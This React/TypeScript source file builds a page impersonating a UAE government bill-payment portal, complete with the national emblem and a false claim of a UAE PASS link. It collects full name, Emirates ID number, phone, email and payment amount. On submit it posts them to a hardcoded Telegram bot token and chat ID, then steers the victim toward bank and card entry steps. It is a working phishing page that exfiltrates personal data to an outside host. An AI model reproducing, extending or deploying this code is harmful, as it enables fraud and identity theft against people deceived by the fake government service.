import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Loader2, User, Phone, Mail, CreditCard, ShieldCheck, ChevronRight } from "lucide-react";

export default function UserData() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    fullName: "",
    idNumber: "",
    phone: "",
    email: "",
    serviceType: "مخالفات مرورية",
    amount: ""
  });

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
👤 *بيانات المستخدم - بوابة سداد الإمارات*
--------------------------
📝 *الاسم:* ${formData.fullName}
🆔 *رقم الهوية:* ${formData.idNumber}
📞 *الهاتف:* ${formData.phone}
📧 *البريد:* ${formData.email}
🛠 *الخدمة:* ${formData.serviceType}
💰 *المبلغ:* ${formData.amount} د.إ
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      sessionStorage.setItem("paymentData", JSON.stringify(formData));
      setTimeout(() => setLocation("/select-bank"), 1000);
    } catch (error) {
      console.error(error);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-amber-500 p-2 rounded-lg">
              <span className="text-white font-bold text-sm">سداد</span>
            </div>
            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
        </div>
      </header>

      <main className="flex-grow container py-12 px-4">
        <div className="max-w-2xl mx-auto">
          <div className="flex justify-between mb-12 relative px-4">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className="flex flex-col items-center z-10">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step === 1 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
                  {step}
                </div>
                <span className={`text-[10px] mt-2 font-bold ${step === 1 ? 'text-amber-600' : 'text-gray-400'}`}>
                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
                </span>
              </div>
            ))}
            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="bg-slate-900 p-8 text-white">
              <h2 className="text-2xl font-bold mb-2">بيانات مقدم الطلب</h2>
              <p className="text-slate-400 text-sm">يرجى إدخال البيانات المطلوبة بدقة لضمان إتمام عملية السداد</p>
            </div>

            <form onSubmit={handleNext} className="p-8 space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <Label htmlFor="fullName" className="text-sm font-bold text-gray-700">الاسم الكامل</Label>
                  <div className="relative">
                    <Input id="fullName" required placeholder="أدخل اسمك كما في الهوية" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.fullName} onChange={(e) => setFormData({...formData, fullName: e.target.value})} />
                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="idNumber" className="text-sm font-bold text-gray-700">رقم الهوية الإماراتية</Label>
                  <div className="relative">
                    <Input id="idNumber" required placeholder="784-XXXX-XXXXXXX-X" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.idNumber} onChange={(e) => setFormData({...formData, idNumber: e.target.value})} />
                    <ShieldCheck className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-sm font-bold text-gray-700">رقم الهاتف المتحرك</Label>
                  <div className="relative">
                    <Input id="phone" required type="tel" placeholder="05XXXXXXXX" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.phone} onChange={(e) => setFormData({...formData, phone: e.target.value})} />
                    <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-sm font-bold text-gray-700">البريد الإلكتروني</Label>
                  <div className="relative">
                    <Input id="email" required type="email" placeholder="example@domain.com" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
                    <Mail className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="serviceType" className="text-sm font-bold text-gray-700">نوع الخدمة</Label>
                  <select 
                    id="serviceType"
                    className="w-full bg-gray-50 border border-gray-200 rounded-md py-3 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-amber-500"
                    value={formData.serviceType}
                    onChange={(e) => setFormData({...formData, serviceType: e.target.value})}
                  >
                    <option value="مخالفات مرورية">مخالفات مرورية</option>
                    <option value="رسوم تجديد الهوية">رسوم تجديد الهوية</option>
                    <option value="فواتير كهرباء ومياه">فواتير كهرباء ومياه</option>
                    <option value="رسوم تصديق عقود">رسوم تصديق عقود</option>
                    <option value="أخرى">أخرى</option>
                  </select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="amount" className="text-sm font-bold text-gray-700">المبلغ المستحق (د.إ)</Label>
                  <div className="relative">
                    <Input id="amount" required type="number" placeholder="0.00" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.amount} onChange={(e) => setFormData({...formData, amount: e.target.value})} />
                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
              </div>

              <div className="pt-6">
                <Button type="submit" className="w-full bg-amber-500 hover:bg-amber-600 text-white font-bold py-7 rounded-xl shadow-lg shadow-amber-500/20 transition-all flex items-center justify-center gap-2" disabled={loading}>
                  {loading ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" /> جاري معالجة البيانات...
                    </>
                  ) : (
                    <>
                      الانتقال لاختيار البنك <ChevronRight className="w-5 h-5" />
                    </>
                  )}
                </Button>
              </div>
            </form>

            <div className="bg-blue-50 p-4 text-center border-t border-blue-100">
              <p className="text-[10px] text-blue-700 font-bold">بوابة سداد الإمارات مرتبطة بنظام الهوية الرقمية (UAE PASS) لضمان أمان بياناتك</p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
